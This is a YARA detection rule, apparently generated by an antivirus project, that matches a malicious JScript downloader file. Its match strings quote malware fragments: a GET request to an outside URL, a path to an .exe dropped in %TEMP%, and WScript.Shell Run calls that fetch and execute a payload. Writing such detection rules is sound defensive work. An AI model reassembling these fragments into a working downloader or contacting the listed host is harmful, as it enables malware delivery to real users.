rule sig_20160329_79bc1bd771e7826f5adb30c7ce6a3f16 {
  meta:
    description = "datamaliciousorder - file 20160329_79bc1bd771e7826f5adb30c7ce6a3f16.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e57f47c74716dd10f8c9d6515c07f0d9a8a45e263abe16f866e149e305ee960b"

  strings:
    $s1  = "KQ[fI](\"GET\", \"http://blog.insite.pt/m8djs\", false);" fullword ascii
    $s2  = "function sK() {return NJ[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"dwl1bvBReSZvtRuO.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[kh](v() * 11); if (KQ[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function B(rc, Jt){b0 = b0 * 1; return rc - Jt;};" fullword ascii
    $s5  = "var NJ = function lA() {return WScript[Du](\"WScript.Shell\");}(), s = 11;" fullword ascii
    $s6  = "function b(){return \"\" + qv;};" fullword ascii
    $s7  = "function D() {return ((oV == true) && (oV == Pd)) ? 1 : b0;};" fullword ascii
    $s8  = "function NF(ST){NJ[\"Run\"](ST, b0, b0);};" fullword ascii
    $s9  = "function oP(Z) {var kI = (1, 2, 3, 4, 5, Z); return kI;};" fullword ascii
    $s10 = "function v0(){return Du;};" fullword ascii
    $s11 = "var GS = new this[\"Date\"]();" fullword ascii
    $s12 = "return B(k, Yj);" fullword ascii
    $s13 = "function v(){return 22;};" fullword ascii
    $s14 = " while (O){" fullword ascii
    $s15 = "Pd = true; " fullword ascii
    $s16 = "oV = true; " fullword ascii
    $s17 = "var Pd = false;" fullword ascii
    $s18 = "var oV = false;" fullword ascii
    $s19 = "} catch(u0){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}